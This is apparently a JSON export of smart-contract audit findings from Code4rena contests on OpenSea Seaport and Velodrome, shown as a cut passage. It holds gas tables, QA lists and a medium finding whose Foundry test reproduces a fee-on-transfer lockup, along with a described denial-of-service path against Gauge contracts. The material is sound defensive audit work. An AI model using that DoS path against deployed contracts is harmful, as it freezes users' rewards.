                 ·          -  ·          -  ·       283643  ·        0.9 %  ·          -  │\n·----------------------------------------------------------------|-------------|-------------|---------------|---------------|-------------·\n```\n\n## Gas After\n```solidity\n·----------------------------------------------------------------|---------------------------|---------------|-----------------------------·\n|                      Solc version: 0.8.13                      ·  Optimizer enabled: true  ·  Runs: 15000  ·  Block limit: 30000000 gas  │\n·································································|···························|···············|······························\n|  Methods                                                                                                                                 │\n······························|··································|·············|·············|···············|···············|··············\n|  Contract                   ·  Method                          ·  Min        ·  Max        ·  Avg          ·  # calls      ·  usd (avg)  │\n······························|··································|·············|·············|···············|···············|··············\n|  Conduit                    ·  execute                         ·      78300  ·    2202995  ·       455832  ·            6  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Conduit                    ·  executeBatch1155                ·          -  ·          -  ·       100007  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Conduit                    ·  executeWithBatch1155            ·     100500  ·     370893  ·       267227  ·            3  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  acceptOwnership                 ·          -  ·          -  ·        33337  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  cancelOwnershipTransfer         ·          -  ·          -  ·        28115  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  createConduit                   ·     723522  ·     723666  ·       723653  ·           31  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  transferOwnership               ·          -  ·          -  ·        50442  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ConduitController          ·  updateChannel                   ·      36091  ·     120728  ·       106631  ·           19  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  approveNFT                      ·          -  ·          -  ·        49693  ·           10  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  registerDigest                  ·          -  ·          -  ·        44157  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  revertWithMessage               ·          -  ·          -  ·        21683  ·            1  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  EIP1271Wallet              ·  setValid                        ·      21705  ·      43617  ·        32661  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  ExcessReturnDataRecipient  ·  setRevertDataSize               ·          -  ·          -  ·        43441  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Reenterer                  ·  prepare                         ·          -  ·          -  ·       763404  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  cancel                          ·      44124  ·      61260  ·        56913  ·           16  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillAdvancedOrder            ·     103898  ·     209532  ·       162767  ·          112  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillAvailableAdvancedOrders  ·     173088  ·     229025  ·       204810  ·           16  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillAvailableOrders          ·     172612  ·     228842  ·       206432  ·           13  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillBasicOrder               ·      93563  ·    1624293  ·       665060  ·          160  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  fulfillOrder                    ·     102612  ·     213241  ·       174439  ·          105  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  incrementNonce                  ·          -  ·          -  ·        47051  ·            6  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  matchAdvancedOrders             ·     206212  ·     272478  ·       255062  ·           67  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  matchOrders                     ·     166542  ·     366330  ·       267910  ·          105  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Seaport                    ·  validate                        ·      58001  ·      69440  ·        67066  ·           21  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC1155                ·  mint                            ·      47321  ·      49989  ·        49456  ·          166  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC1155                ·  setApprovalForAll               ·      26136  ·      46036  ·        45879  ·          254  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  approve                         ·      28884  ·      46248  ·        45572  ·          162  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  blockTransfer                   ·      22006  ·      43918  ·        32962  ·            4  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  mint                            ·      33947  ·      68483  ·        55519  ·           74  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC20                  ·  setNoReturnData                 ·      21954  ·      43866  ·        32910  ·            2  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC721                 ·  mint                            ·      51544  ·      68656  ·        65632  ·          136  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  TestERC721                 ·  setApprovalForAll               ·      26211  ·      46111  ·        45230  ·          226  ·          -  │\n······························|··································|·············|·············|···············|···············|··············\n|  Deployments                                                   ·                                           ·  % of limit   ·             │\n·································································|·············|·············|···············|···············|··············\n|  Consideration                                                 ·          -  ·          -  ·      5335122  ·       17.8 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  EIP1271Wallet                                                 ·     600395  ·     600407  ·       600406  ·          2 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  ExcessReturnDataRecipient                                     ·          -  ·          -  ·       511260  ·        1.7 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  Reenterer                                                     ·          -  ·          -  ·       534991  ·        1.8 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestERC1155                                                   ·          -  ·          -  ·      1012405  ·        3.4 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestERC20                                                     ·          -  ·          -  ·      1039822  ·        3.5 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestERC721                                                    ·          -  ·          -  ·      1094209  ·        3.6 %  ·          -  │\n·································································|·············|·············|···············|···············|··············\n|  TestZone                                                      ·          -  ·          -  ·       283643  ·        0.9 %  ·          -  │\n·----------------------------------------------------------------|-------------|-------------|---------------|---------------|-------------·\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-opensea-seaport-findings",
      "repo": "https://github.com/code-423n4/2022-05-opensea-seaport-findings",
      "url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/164"
    }
  },
  {
    "title": "QA Report",
    "body": "1) Floating Pragma\n\nIn the lines (<https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/conduit/Conduit.sol#L2>, https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/TokenTransferrer.sol#L2), there’s a floating Pragma. Contracts should be deployed with the same compiler version and flags that they have been tested with to avoid using an outdated compiler version that might introduce bugs. \n\n2) No 0 address check for initialOwner, as well as user being able to create a conduit with anyone as the owner\n\nIn the function createConduit (https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/conduit/ConduitController.sol#L57) the user can create a conduit with any address as its owner, as there is no checks when it comes to the initialOwner variable. While this could be intended, in the function transferOwnership (https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/conduit/ConduitController.sol#L189) there is a check to prevent the conduit to be transferred to address 0, and after transferOwnership is called, the address used as newPotentialOwner needs to call the function acceptOwnership, which does not happen in the createConduit function so a user could create a conduit with anyone as the owner, bypassing both a 0 address check and the process of transfer.\n\n3) Typo\n\n(https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/conduit/Conduit.sol#L175)\nThis comment is describing the wrong behavior and probably a remnant of an old version of the code, while the comment is talking about native tokens and Ether, code below is about ERC20s. ",
    "dataSource": {
      "name": "code-423n4/2022-05-opensea-seaport-findings",
      "repo": "https://github.com/code-423n4/2022-05-opensea-seaport-findings",
      "url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/163"
    }
  },
  {
    "title": "Bribe.sol is not meant to handle fee-on-transfer tokens",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/Bribe.sol#L50-L51\nhttps://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/Bribe.sol#L83-L90\n\n\n# Vulnerability details\n\n## Impact\nShould a fee-on-transfer token be added as a reward token and deposited, the tokens will be locked in the `Bribe` contract. Voters will be unable to withdraw their rewards.\n\n## Proof of Concept\nTokens are deposited into the `Bribe` contract using `notifyRewardAmount()`, where `amount` of tokens are transferred, then added directly to `tokenRewardsPerEpoch[token][adjustedTstamp]`:\n```js\n    _safeTransferFrom(token, msg.sender, address(this), amount);\n    tokenRewardsPerEpoch[token][adjustedTstamp] = epochRewards + amount;\n```\n\nTokens are transferred out of the `Bribe` contract using `deliverReward()`, which attempts to transfer `tokenRewardsPerEpoch[token][epochStart]` amount of tokens out.\n```js\nfunction deliverReward(address token, uint epochStart) external lock returns (uint) {\n    require(msg.sender == gauge);\n    uint rewardPerEpoch = tokenRewardsPerEpoch[token][epochStart];\n    if (rewardPerEpoch > 0) {\n        _safeTransfer(token, address(gauge), rewardPerEpoch);\n    }\n    return rewardPerEpoch;\n}\n```\n\nIf `token` happens to be a fee-on-transfer token, `deliverReward()` will always fail. For example:\n* User calls `notifyRewardAmount()`, with `token` as token that charges a 2% fee upon any transfer, and `amount = 100`:\n    * `_safeTransferFrom()` only transfers 98 tokens to the contract due to the 2% fee\n    * Assuming `epochRewards = 0`, `tokenRewardsPerEpoch[token][adjustedTstamp]` becomes `100`\n* Later on, when `deliverReward()` is called with the same `token` and `epochStart`:\n    * `rewardPerEpoch = tokenRewardsPerEpoch[token][epochStart] = 100`\n    * `_safeTransfer` attempts to transfer 100 tokens out of the contract\n    * However, the contract only contains 98 tokens\n    * `deliverReward()` reverts\n\nThe following test, which implements a [MockERC20 with fee-on-transfer](https://gist.github.com/MiloTruck/6fe0a13c4d08689b8be8a55b9b14e7e1), demonstrates this:  \n```js\n// Note that the following test was adapted from Bribes.t.sol\nfunction testFailFeeOnTransferToken() public {\n    // Deploy ERC20 token with fee-on-transfer\n    MockERC20Fee FEE_TOKEN = new MockERC20Fee(\"FEE\", \"FEE\", 18);\n\n    // Mint FEE token for address(this)\n    FEE_TOKEN.mint(address(this), 1e25);\n    \n    // vote\n    VELO.approve(address(escrow), TOKEN_1);\n    escrow.create_lock(TOKEN_1, 4 * 365 * 86400);\n    vm.warp(block.timestamp + 1);\n\n    address[] memory pools = new address[](1);\n    pools[0] = address(pair);\n    uint256[] memory weights = new uint256[](1);\n    weights[0] = 10000;\n    voter.vote(1, pools, weights);\n\n    // and deposit into the gauge!\n    pair.approve(address(gauge), 1e9);\n    gauge.deposit(1e9, 1);\n\n    vm.warp(block.timestamp + 12 hours); // still prior to epoch start\n    vm.roll(block.number + 1);\n    assertEq(uint(gauge.getVotingStage(block.timestamp)), uint(Gauge.VotingStage.BribesPhase));\n\n    vm.warp(block.timestamp + 12 hours); // start of epoch\n    vm.roll(block.number + 1);\n    assertEq(uint(gauge.getVotingStage(block.timestamp)), uint(Gauge.VotingStage.VotesPhase));\n\n    vm.warp(block.timestamp + 5 days); // votes period over\n    vm.roll(block.number + 1);\n\n    vm.warp(2 weeks + 1); // emissions start\n    vm.roll(block.number + 1);\n\n    minter.update_period();\n    distributor.claim(1); // yay this works\n\n    vm.warp(block.timestamp + 1 days); // next votes period start\n    vm.roll(block.number + 1);\n\n    // get a bribe\n    owner.approve(address(FEE_TOKEN), address(bribe), TOKEN_1);\n    bribe.notifyRewardAmount(address(FEE_TOKEN), TOKEN_1);\n\n    vm.warp(block.timestamp + 5 days); // votes period over\n    vm.roll(block.number + 1);\n\n    // Atttempt to claim tokens will revert\n    voter.distro(); // bribe gets deposited in the gauge\n}\n```\n\n## Additional Impact\nOn a larger scale, a malicious attacker could temporarily DOS any `Gauge` contract. This can be done by:\n1. Depositing a fee-on-transfer token into its respective `Bribe` contract, using `notifyRewardAmount()`, and adding it as a reward token.\n2. This would cause `deliverBribes()` to fail whenever it is called, thus no one would be able to withdraw any reward tokens from the `Gauge` contract.\n\nThe only way to undo the DOS would be to call `swapOutBribeRewardToken()` and swap out the fee-on-transfer token for another valid token.\n\n## Recommended Mitigation\n* The amount of tokens received should be added to `epochRewards` and stored in `tokenRewardsPerEpoch[token][adjustedTstamp]`, instead of the amount stated for transfer. For example:\n```js\n    uint256 _before = IERC20(token).balanceOf(address(this));\n    _safeTransferFrom(token, msg.sender, address(this), amount);\n    uint256 _after = IERC20(token).balanceOf(address(this));\n\n    tokenRewardsPerEpoch[token][adjustedTstamp] = epochRewards + (_after - _before);\n```\n* Alternatively, disallow tokens with fee-on-transfer mechanics to be added as reward tokens.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-velodrome-findings",
      "repo": "https://github.com/code-423n4/2022-05-velodrome-findings",
      "url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/222"
    }
  },
  {
    "title": "QA Report",
    "body": "Low Risk \n\n1. Title : Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n1.) File : contracts/contracts/Voter.sol ([Line.55](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Voter.sol#L55))\n\n```\n        _ve = __ve;\n```\n2.) File : contracts/contracts/Voter.sol ([Line.56](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Voter.sol#L56))\n\n```\n        factory = _factory;\n```\n\n3.) File : contracts/contracts/Voter.sol ([Line.58](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Voter.sol#L58))\n\n```\n        gaugefactory = _gauges;\n```\n\n4.) File : contracts/contracts/Voter.sol ([Line.59](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Voter.sol#L59))\n\n\n```\n        bribefactory = _bribes;\n```\n\n5.) File : contracts/contracts/PairFees.sol ([Line.15](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/PairFees.sol#L15))\n\n```\n        token0 = _token0;\n```\n\n6.) File : contracts/contracts/PairFees.sol ([Line.16](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/PairFees.sol#L16))\n\n```\n        token1 = _token1;\n```\n\n7.) File : contracts/contracts/Velo.sol ([Lines.68-72](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Velo.sol#L68-L72))\n\ncheck `account` \n\n```\n         function mint(address account, uint amount) external returns (bool) {\n        require(msg.sender == minter);\n        _mint(account, amount);\n        return true;\n    }\n```\n\n8.) File : contracts/contracts/Gauge.sol ([Lines.678-683](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L678-L683))\n\ncheck `spender`\n\n```\n    function _safeApprove(address token, address spender, uint256 value) internal {\n        require(token.code.length > 0);\n        (bool success, bytes memory data) =\n        token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))));\n    }\n```\n\n2. Title : Event is missing `indexed` fields\n\nEach event should use three indexed fields if there are three or more fields\n\n1.)  File : contract/contracts/VotingEscrow.sol ([Line.60](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L60))\n\n```\n    event Supply(uint prevSupply, uint supply);\n```\n\n3. Title : require() should be used instead of assert()\n\n1.) File : main/contracts/contracts/VotingEscrow.sol ([Line.262](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L262))\n\n```\n        assert(_operator != msg.sender);\n```\n\n2.) File : main/contracts/contracts/VotingEscrow.sol ([Line.272](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L272))\n\n```\n        assert(idToOwner[_tokenId] == _owner);\n```\n3.) File : main/contracts/contracts/VotingEscrow.sol ([Line.447](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L447))\n\n```            \n       assert(idToOwner[_tokenId] == address(0));\n```\n4.) File : main/contracts/contracts/VotingEscrow.sol ([Line.464](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L464))\n\n```            \n       assert(_to != address(0));\n```\n5.) File : main/contracts/contracts/VotingEscrow.sol ([Line.508](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L508))\n\n```            \n       assert(idToOwner[_tokenId] == _from);\n```\n6.) File : main/contracts/contracts/VotingEscrow.sol ([Line.748](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L748))\n\n```            \n       assert(IERC20(token).transferFrom(from, address(this), _value));\n```\n7.) File : main/contracts/contracts/VotingEscrow.sol ([Line.815](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L815))\n\n```            \n        assert(_isApprovedOrOwner(msg.sender, _tokenId));\n```\n8.) File : main/contracts/contracts/VotingEscrow.sol ([Line.819](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L819))\n\n```            \n        assert(_value > 0); // dev: need non-zero value\n```\n9.) File : main/contracts/contracts/VotingEscrow.sol ([Line.829](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L829))\n\n```            \n         assert(_isApprovedOrOwner(msg.sender, _tokenId));\n```\n10.) File : main/contracts/contracts/VotingEscrow.sol ([Line.845](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L845))\n\n```            \n         assert(_isApprovedOrOwner(msg.sender, _tokenId));\n```\n11.) File : main/contracts/contracts/VotingEscrow.sol ([Line.861](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L861))\n\n```            \n          assert(IERC20(token).transfer(msg.sender, value));\n```\n12.) File : main/contracts/contracts/VotingEscrow.sol ([Line.937](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L937))\n\n```            \n          assert(_block <= block.number);\n```\n13.) File : main/contracts/contracts/VotingEscrow.sol ([Line.991](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/VotingEscrow.sol#L991))\n\n```            \n          assert(_block <= block.number);\n```\n\n4. Title : Lack of event \n\nEvent is an inheritable member of a contract. An event is emitted, it stores the arguments passed in transaction logs\n\n1.) File : contracts/contracts/Velo.sol : ([Lines.17-18](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Velo.sol#L17-L18))\n\n## Recommended Mitigation \n\nadding `event Mint` \n\n5. Title : Open TODOs\n\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment\n\n1.) File : contracts/contracts/VelodromeLibrary.sol ([Line.9](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VelodromeLibrary.sol#L9))\n\n```\n     // TODO make modifiable?\n```\n\n2.) File : contracts/contracts/VotingEscrow.sol ([Line.39](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L39))\n\n```\n     * What we can do is to extrapolate ***At functions */\n```\n\n3.) File : contracts/contracts/VotingEscrow.sol#L633 ([Line.633](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L633))\n\n```\n       // Hopefully it won't happen that this won't get used in 5 years!\n```\n\n4.) File : contracts/contracts/VotingEscrow.sol#L633 ([Line.689](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L689))\n\n```\n        // old_dslope was <something> - u_old.slope, so we cancel that\n```\n6. Multiple `address` mappings can be combined into a `single mapping of an address to a struct\n\n1.) File : contracts/contracts/Voter.sol ([Lines.30-32](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Voter.sol#L30-L32))\n\n```\n    mapping(address => address) public gauges; // pool => gauge\n    mapping(address => address) public poolForGauge; // gauge => pool\n    mapping(address => address) public bribes; // gauge => bribe\n```\n\n7. Require to check if value `> 0`\n\n1.) File : contracts/contracts/Velo.sol ([Lines.68-72](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Velo.sol#L68-L72))\n\n```\n         function mint(address account, uint amount) external returns (bool) {\n        require(msg.sender == minter);\n        _mint(account, amount);\n        return true;\n   }\n```\n\n8. Need to be checked value so no transfer amount exceeeds allowance\n\nFile : contracts/contracts/Velo.sol ([Lines.60-66](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Velo.sol#L60-L66))\n\n## Recommended Mitigation\n\nadding \n\n```\n       require(_value <= allowed_from,\n            \"Velo: transfer amount exceeds allowance\");\n```\nNON CRITICAL \n\n9. Title : Consider make the constracts pausable\n\nThere are many external risks so the suggestion was it should  be consider making the contracts pausable, so if in the case of an unexpected event, the admin can pause transfers.\n\n## Tool Used\nManual Review\n\n##POC\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol\n\n## Recommended Mitigation Steps\nConsider making contracts Pausable\n\n10. Title : NatSpec is incomplete\n\n1.) File : contracts/contracts/VotingEscrow.sol ([Line.222-224](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L222-L227))\n\nMissing `@return`\n\n```\n    /// @dev Checks if `_operator` is an approved operator for `_owner`.\n    /// @param _owner The address that owns the NFTs.\n    /// @param _operator The address that acts on behalf of the owner.\n    function isApprovedForAll(address _owner, address _operator) external view returns (bool) {\n        return (ownerToOperators[_owner])[_operator];\n    }\n```\n\n2.) File : contracts/contracts/VotingEscrow.sol ([Lines.778-781](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L778-L795))\n\nMissing `@return`\n\n```\n    /// @notice Deposit `_value` tokens for `_to` and lock for `_lock_duration`\n    /// @param _value Amount to deposit\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n    /// @param _to Address to deposit\n    function _create_lock(uint _value, uint _lock_duration, address _to) internal returns (uint) {\n        uint unlock_time = (block.timestamp + _lock_duration) / WEEK * WEEK; // Locktime is rounded down to weeks\n\n\n        require(_value > 0); // dev: need non-zero value\n        require(unlock_time > block.timestamp, 'Can only lock until time in the future');\n        require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 4 years max');\n\n\n        ++tokenId;\n        uint _tokenId = tokenId;\n        _mint(_to, _tokenId);\n\n\n        _deposit_for(_tokenId, _value, unlock_time, locked[_tokenId], DepositType.CREATE_LOCK_TYPE);\n        return _tokenId;\n    }\n```\n\n3.) File : contracts/contracts/VotingEscrow.sol ([Lines.778-781](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L797-L802))\n\nMissing `@return`\n\n```\n    /// @notice Deposit `_value` tokens for `msg.sender` and lock for `_lock_duration`\n    /// @param _value Amount to deposit\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n    function create_lock(uint _value, uint _lock_duration) external nonreentrant returns (uint) {\n        return _create_lock(_value, _lock_duration, msg.sender);\n    }\n```\n\n4.) File : contracts/contracts/VotingEscrow.sol ([Lines.778-781](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L804-L810))\n\nMissing `@return`\n\n```\n    /// @notice Deposit `_value` tokens for `_to` and lock for `_lock_duration`\n    /// @param _value Amount to deposit\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n    /// @param _to Address to deposit\n    function create_lock_for(uint _value, uint _lock_duration, address _to) external nonreentrant returns (uint) {\n        return _create_lock(_value, _lock_duration, _to);\n    }\n```\n11. require()/revert() statements should have descriptive reason strings\n\n1.) File : contracts/contracts/Gauge.sol ([Line.512](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L512))\n\n```\n        require(amount > 0);\n```\n2.) File : contracts/contracts/Gauge.sol ([Line.591](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L591))\n\n```\n        require(token != stake);\n```\n\n3.) File : contracts/contracts/Gauge.sol ([Line.592](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L592))\n\n```\n        require(amount > 0);\n```\n\n4.) File : contracts/contracts/Gauge.sol ([Line.613](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L613))\n\n```\n        require(rewardRate[token] > 0);\n```\n\n12. Title : Consider to use `// SPDX-License-Identifier: MIT` for interface for removing warning\n\nSince this was `out of scope` but some of contracts was gonna do warning bout // SPDX , it better to used // SPDX for interface to remove this warn for good.\n\n## Tool Used \nRemix \n\n1.) File : contracts/contracts/interfaces/IGaugeFactory.sol ([1](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IGaugeFactory.sol))\n\n2.) File : contracts/contracts/interfaces/IPairCallee.sol ([2](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IPairCallee.sol))\n\n3.) File : contracts/contracts/interfaces/IERC20.sol ([3](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IERC20.sol))\n\n4.) File : contracts/contracts/interfaces/IGauge.sol ([4](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IGauge.sol))\n\n5.) FIle : contracts/contracts/interfaces/IMinter.sol ([5](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IMinter.sol))\n\n6.) File : contracts/contracts/interfaces/IPair.sol ([6](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IPair.sol))\n\n7.) File : contracts/contracts/interfaces/IPairFactory.sol ([7](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IPairFactory.sol))\n\n8.) File : contracts/contracts/interfaces/IVoter.sol ([8](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IVoter.sol))\n\n9.) File : contracts/contracts/interfaces/IVotingEscrow.sol ([9](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IVotingEscrow.sol))\n\n10.) File : contracts/contracts/interfaces/IVelo.sol ([10](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IVelosol))\n\n11.) File : contracts/contracts/interfaces/IRewardsDistributor.sol ([11](https://github.com/code-423n4/2022-05-velodrome/blob/main/contracts/contracts/interfaces/IRewardsDistributor.sol))\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-velodrome-findings",
      "repo": "https://github.com/code-423n4/2022-05-velodrome-findings",
      "url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/211"
    }
  },
  {
    "title": "QA Report",
    "body": "**Table of Contents:**\n\n- [[L-01] Check Effects Interactions pattern not respected](#l-01-check-effects-indteractions-pattern-not-respected)\n- [[L-02] Deprecated approve() function](#l-02-deprecated-approve-function)\n- [[L-03] No account existence check for low-level call](#l-03-no-account-existence-check-for-low-level-call)\n- [[L-04] Add a timelock and event to critical functions](#l-04-add-a-timelock-and-event-to-critical-functions)\n- [[L-05] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-05-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)\n- [[N-01] Open TODOS](#n-01-open-todos)\n- [[N-02] Missing friendly revert strings](#n-02-missing-friendly-revert-strings)\n- [[N-03] `require()` should be used for checking error conditions on inputs and return values while `assert()` should be used for invariant checking](#n-03-require-should-be-used-for-checking-error-conditions-on-inputs-and-return-values-while-assert-should-be-used-for-invariant-checking)\n\n## [L-01] Check Effects Interactions pattern not respected\n\nTo avoid unexpected behavior in the future (be it for the solution or for a fork), it's recommended to always follow the CEI pattern.\n\nConsider always moving the state-changes before the external calls.\n\nAffected code:\n\n```solidity\nFile: RewardsDistributor.sol\n282:     function claim(uint _tokenId) external returns (uint) {\n283:         if (block.timestamp >= time_cursor) _checkpoint_total_supply();\n284:         uint _last_token_time = last_token_time;\n285:         _last_token_time = _last_token_time / WEEK * WEEK;\n286:         uint amount = _claim(_tokenId, voting_escrow, _last_token_time);\n287:         if (amount != 0) {\n288:             